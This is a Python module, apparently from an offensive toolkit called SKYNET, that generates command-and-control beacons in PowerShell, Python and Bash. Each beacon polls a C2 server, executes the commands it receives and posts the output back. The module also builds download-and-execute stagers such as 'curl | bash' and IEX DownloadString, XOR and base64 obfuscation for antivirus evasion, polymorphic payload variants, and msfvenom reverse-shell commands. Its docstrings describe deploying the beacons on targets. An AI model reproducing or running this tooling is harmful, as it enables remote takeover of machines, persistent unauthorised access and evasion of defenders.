"""
SKYNET Command & Control - Beacon Generation

Beacon and implant generation with AV evasion.

Clearance Level: Omega-Strike (Command & Control Authority)
Specialization: Beacon generation, payload obfuscation, AV evasion
Mission: Generate undetectable beacons for persistent C2

This module provides:
- Beacon template generation
- AV evasion techniques
- Polymorphic code generation
- Multi-platform beacon support
- Custom encoder/decoder generation
"""

import base64
import random
import secrets
import string
from typing import Any


def generate_beacon(
    c2_url: str,
    beacon_type: str = "http",
    platform: str = "windows",
    sleep_time: int = 60,
    jitter: float = 0.2,
    evasion: str = "basic",
) -> dict[str, Any]:
    """
    Generate C2 beacon with AV evasion.

    Beacon Types:
    - http: HTTP/HTTPS beacon
    - dns: DNS tunneling beacon
    - smb: Named pipe beacon (lateral movement)
    - tcp: Direct TCP beacon

    Platforms:
    - windows: Windows executable
    - linux: Linux ELF binary
    - powershell: PowerShell script
    - python: Python script
    - bash: Bash script

    Evasion Levels:
    - basic: Simple obfuscation
    - moderate: Base64 + XOR encoding
    - advanced: Polymorphic code + encryption
    - paranoid: All techniques + anti-debug

    Args:
        c2_url: C2 server URL (e.g., http://10.10.14.5:8080)
        beacon_type: Beacon communication type
        platform: Target platform
        sleep_time: Sleep interval in seconds
        jitter: Jitter factor (0.0-1.0) for timing randomization
        evasion: Evasion level

    Returns:
        Generated beacon code and metadata

    Example:
        >>> from skynet.tools.command_and_control import generate_beacon
        >>>
        >>> # Generate PowerShell beacon
        >>> result = generate_beacon(
        ...     c2_url="http://10.10.14.5:8080",
        ...     beacon_type="http",
        ...     platform="powershell",
        ...     sleep_time=60,
        ...     evasion="advanced"
        ... )
        >>>
        >>> # Save beacon
        >>> with open("beacon.ps1", "w") as f:
        ...     f.write(result['code'])
        >>>
        >>> # Deploy on target: powershell -ep bypass -f beacon.ps1
    """
    results = {
        "c2_url": c2_url,
        "beacon_type": beacon_type,
        "platform": platform,
        "code": "",
        "filename": "",
        "evasion_techniques": [],
        "success": False,
        "error": None,
    }

    try:
        beacon_id = secrets.token_hex(8)

        if platform == "powershell":
            code = _generate_powershell_beacon(c2_url, beacon_id, sleep_time, jitter, evasion)
            results["filename"] = f"beacon_{beacon_id}.ps1"

        elif platform == "python":
            code = _generate_python_beacon(c2_url, beacon_id, sleep_time, jitter, evasion)
            results["filename"] = f"beacon_{beacon_id}.py"

        elif platform == "bash":
            code = _generate_bash_beacon(c2_url, beacon_id, sleep_time, jitter, evasion)
            results["filename"] = f"beacon_{beacon_id}.sh"

        elif platform == "windows":
            results["error"] = "Windows EXE generation requires compilation (use msfvenom or custom compiler)"
            results["code"] = (
                "# Use msfvenom: msfvenom -p windows/meterpreter/reverse_https LHOST=... LPORT=... -f exe > beacon.exe"
            )
            return results

        elif platform == "linux":
            results["error"] = "Linux ELF generation requires compilation"
            results["code"] = (
                "# Use msfvenom: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f elf > beacon.elf"
            )
            return results

        else:
            results["error"] = f"Unsupported platform: {platform}"
            return results

        results["code"] = code
        results["success"] = True

        # Document evasion techniques used
        if evasion in ["moderate", "advanced", "paranoid"]:
            results["evasion_techniques"].append("Base64 encoding")
            results["evasion_techniques"].append("XOR encryption")

        if evasion in ["advanced", "paranoid"]:
            results["evasion_techniques"].append("String obfuscation")
            results["evasion_techniques"].append("Variable name randomization")

        if evasion == "paranoid":
            results["evasion_techniques"].append("Anti-debugging")
            results["evasion_techniques"].append("Sandbox detection")

    except Exception as e:
        results["error"] = str(e)

    return results


def _generate_powershell_beacon(c2_url: str, beacon_id: str, sleep_time: int, jitter: float, evasion: str) -> str:
    """Generate PowerShell beacon code."""

    if evasion == "basic":
        # Basic beacon (minimal evasion)
        code = f'''# SKYNET PowerShell Beacon
$c2 = "{c2_url}"
$id = "{beacon_id}"
$sleep = {sleep_time}

while($true) {{
    try {{
        # Check for commands
        $url = "$c2/$id"
        $cmd = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

        if($cmd) {{
            # Decode and execute
            $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd))
            $output = Invoke-Expression $decoded 2>&1 | Out-String

            # Send output back
            $encoded_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
            Invoke-WebRequest -Uri $url -Method POST -Body $encoded_output -UseBasicParsing
        }}
    }} catch {{}}

    # Sleep with jitter
    Start-Sleep -Seconds ($sleep + (Get-Random -Minimum 0 -Maximum ({sleep_time * jitter})))
}}
'''

    elif evasion in ["moderate", "advanced", "paranoid"]:
        # Advanced beacon with obfuscation

        # Random variable names
        vars = {
            "c2": _random_var(),
            "id": _random_var(),
            "sleep": _random_var(),
            "cmd": _random_var(),
            "output": _random_var(),
            "url": _random_var(),
        }

        # XOR key for encryption
        xor_key = random.randint(1, 255)

        code = f'''# SKYNET Advanced PowerShell Beacon
function {_random_var()} {{
    param($s,$k)
    $r = ""
    for($i=0;$i -lt $s.Length;$i++){{$r+=[char]([byte][char]$s[$i] -bxor $k)}}
    return $r
}}

${vars["c2"]}="{_xor_string(c2_url, xor_key)}"
${vars["id"]}="{_xor_string(beacon_id, xor_key)}"
${vars["sleep"]}={sleep_time}
$k={xor_key}

# Decode C2 URL and ID
${vars["c2"]}={_random_var()} ${vars["c2"]} $k
${vars["id"]}={_random_var()} ${vars["id"]} $k

while($true){{
    try{{
        ${vars["url"]}="${{vars['c2']}}/${{vars['id']}}"
        ${vars["cmd"]}=(IWR -Uri ${vars["url"]} -UseBasicParsing).Content

        if(${vars["cmd"]}){{
            $d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${vars["cmd"]}))
            ${vars["output"]}=IEX $d 2>&1|Out-String

            $e=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(${vars["output"]}))
            IWR -Uri ${vars["url"]} -Method POST -Body $e -UseBasicParsing|Out-Null
        }}
    }}catch{{}}

    Start-Sleep -Seconds (${vars["sleep"]}+(Get-Random -Minimum 0 -Maximum {int(sleep_time * jitter)}))
}}
'''

    return code


def _generate_python_beacon(c2_url: str, beacon_id: str, sleep_time: int, jitter: float, evasion: str) -> str:
    """Generate Python beacon code."""

    if evasion == "basic":
        code = f'''#!/usr/bin/env python3
# SKYNET Python Beacon
import requests
import base64
import time
import subprocess
import random

C2_URL = "{c2_url}"
BEACON_ID = "{beacon_id}"
SLEEP_TIME = {sleep_time}
JITTER = {jitter}

while True:
    try:
        # Check for commands
        url = f"{{C2_URL}}/{{BEACON_ID}}"
        response = requests.get(url, timeout=10)

        if response.status_code == 200 and response.text:
            # Decode and execute command
            cmd = base64.b64decode(response.text).decode()
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)

            # Send output back
            encoded_output = base64.b64encode(output).decode()
            requests.post(url, data=encoded_output, timeout=10)
    except Exception:
        pass

    # Sleep with jitter
    jitter_time = random.uniform(0, SLEEP_TIME * JITTER)
    time.sleep(SLEEP_TIME + jitter_time)
'''

    elif evasion in ["moderate", "advanced", "paranoid"]:
        # Obfuscated version
        xor_key = random.randint(1, 255)

        c2_encoded = "".join([f"\\\\x{{ord(c) ^ {xor_key}:02x}}" for c in c2_url])
        id_encoded = "".join([f"\\\\x{{ord(c) ^ {xor_key}:02x}}" for c in beacon_id])

        code = f'''#!/usr/bin/env python3
import requests,base64,time,subprocess,random

def d(s,k):
    return ''.join([chr(c^k) for c in s])

_c=b"{c2_encoded}"
_i=b"{id_encoded}"
_s={sleep_time}
_j={jitter}
_k={xor_key}

_c=d(_c,_k)
_i=d(_i,_k)

while True:
    try:
        u=f"{{_c}}/{{_i}}"
        r=requests.get(u,timeout=10)
        if r.status_code==200 and r.text:
            c=base64.b64decode(r.text).decode()
            o=subprocess.check_output(c,shell=True,stderr=subprocess.STDOUT,timeout=30)
            e=base64.b64encode(o).decode()
            requests.post(u,data=e,timeout=10)
    except:pass
    time.sleep(_s+random.uniform(0,_s*_j))
'''

    return code


def _generate_bash_beacon(c2_url: str, beacon_id: str, sleep_time: int, jitter: float, evasion: str) -> str:
    """Generate Bash beacon code."""

    code = f'''#!/bin/bash
# SKYNET Bash Beacon

C2="{c2_url}"
ID="{beacon_id}"
SLEEP={sleep_time}

while true; do
    # Check for commands
    CMD=$(curl -s "$C2/$ID")

    if [ -n "$CMD" ]; then
        # Decode and execute
        DECODED=$(echo "$CMD" | base64 -d)
        OUTPUT=$(eval "$DECODED" 2>&1)

        # Send output back
        ENCODED=$(echo "$OUTPUT" | base64 -w 0)
        curl -s -X POST -d "$ENCODED" "$C2/$ID" > /dev/null
    fi

    # Sleep with jitter
    JITTER=$((RANDOM % {int(sleep_time * jitter)}))
    sleep $(($SLEEP + $JITTER))
done
'''

    return code


def _random_var(length: int = 8) -> str:
    """Generate random variable name."""
    return "".join(random.choices(string.ascii_letters, k=length))


def _xor_string(text: str, key: int) -> str:
    """XOR encode string."""
    return "".join([chr(ord(c) ^ key) for c in text])


def obfuscate_beacon(beacon_code: str, method: str = "base64") -> dict[str, Any]:
    """
    Obfuscate beacon code for additional evasion.

    Methods:
    - base64: Base64 encoding
    - xor: XOR encryption
    - gzip: Gzip compression + base64
    - rot13: ROT13 encoding

    Args:
        beacon_code: Original beacon code
        method: Obfuscation method

    Returns:
        Obfuscated code and decoder

    Example:
        >>> from skynet.tools.command_and_control import obfuscate_beacon
        >>>
        >>> # Obfuscate PowerShell beacon
        >>> result = obfuscate_beacon(
        ...     beacon_code=ps_code,
        ...     method="base64"
        ... )
        >>>
        >>> # result['code'] contains obfuscated version
        >>> # result['decoder'] contains decoder stub
    """
    results = {"method": method, "code": "", "decoder": "", "success": False, "error": None}

    try:
        if method == "base64":
            encoded = base64.b64encode(beacon_code.encode()).decode()

            # PowerShell decoder
            results["decoder"] = (
                f"$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}'));IEX $code"
            )
            results["code"] = encoded

        elif method == "xor":
            key = random.randint(1, 255)
            encoded = "".join([chr(ord(c) ^ key) for c in beacon_code])
            encoded_b64 = base64.b64encode(encoded.encode()).decode()

            results["decoder"] = (
                f"$e='{encoded_b64}';$k={key};$d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e));$c='';for($i=0;$i -lt $d.Length;$i++){{$c+=[char]([byte][char]$d[$i] -bxor $k)}};IEX $c"
            )
            results["code"] = encoded_b64

        elif method == "gzip":
            import gzip

            compressed = gzip.compress(beacon_code.encode())
            encoded = base64.b64encode(compressed).decode()

            results["decoder"] = (
                f"$e='{encoded}';$d=[System.Convert]::FromBase64String($e);$ms=New-Object System.IO.MemoryStream(,$d);$gs=New-Object System.IO.Compression.GzipStream($ms,[System.IO.Compression.CompressionMode]::Decompress);$sr=New-Object System.IO.StreamReader($gs);$c=$sr.ReadToEnd();IEX $c"
            )
            results["code"] = encoded

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def generate_stager(beacon_url: str, platform: str = "powershell") -> dict[str, Any]:
    """
    Generate minimal stager to download and execute full beacon.

    Args:
        beacon_url: URL where full beacon is hosted
        platform: Platform (powershell, python, bash)

    Returns:
        Stager code

    Example:
        >>> from skynet.tools.command_and_control import generate_stager
        >>>
        >>> # Generate PowerShell stager
        >>> result = generate_stager(
        ...     beacon_url="http://10.10.14.5:8000/beacon.ps1",
        ...     platform="powershell"
        ... )
        >>>
        >>> # One-liner stager
        >>> print(result['oneliner'])
    """
    results = {
        "beacon_url": beacon_url,
        "platform": platform,
        "code": "",
        "oneliner": "",
        "success": False,
        "error": None,
    }

    try:
        if platform == "powershell":
            results["code"] = f"IEX (New-Object Net.WebClient).DownloadString('{beacon_url}')"
            results["oneliner"] = (
                f"powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('{beacon_url}')\""
            )

        elif platform == "python":
            results["code"] = f"import urllib.request;exec(urllib.request.urlopen('{beacon_url}').read())"
            results["oneliner"] = (
                f"python3 -c \"import urllib.request;exec(urllib.request.urlopen('{beacon_url}').read())\""
            )

        elif platform == "bash":
            results["code"] = f"curl -s {beacon_url} | bash"
            results["oneliner"] = f"curl -s {beacon_url} | bash"

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def generate_payload_variants(base_payload: str, num_variants: int = 5) -> dict[str, Any]:
    """
    Generate polymorphic variants of payload.

    Creates multiple variants with different:
    - Variable names
    - Code structure
    - Encoding schemes
    - Comment placement

    Args:
        base_payload: Original payload code
        num_variants: Number of variants to generate

    Returns:
        List of payload variants

    Example:
        >>> from skynet.tools.command_and_control import generate_payload_variants
        >>>
        >>> # Generate 10 variants
        >>> result = generate_payload_variants(
        ...     base_payload=beacon_code,
        ...     num_variants=10
        ... )
        >>>
        >>> # Each variant has different signature
        >>> for i, variant in enumerate(result['variants']):
        ...     with open(f"beacon_v{i}.ps1", "w") as f:
        ...         f.write(variant)
    """
    results = {"num_variants": num_variants, "variants": [], "success": False, "error": None}

    try:
        for _i in range(num_variants):
            variant = base_payload

            # Randomize variable names
            for _ in range(10):
                old_var = f"$var{_}"
                new_var = f"${_random_var()}"
                variant = variant.replace(old_var, new_var)

            # Add random comments
            comments = [
                "# System initialization",
                "# Configuration loading",
                "# Network setup",
                "# Processing data",
            ]
            variant = f"{random.choice(comments)}\n{variant}"

            # Random whitespace
            variant = variant.replace("\n\n", "\n" * random.randint(1, 3))

            results["variants"].append(variant)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
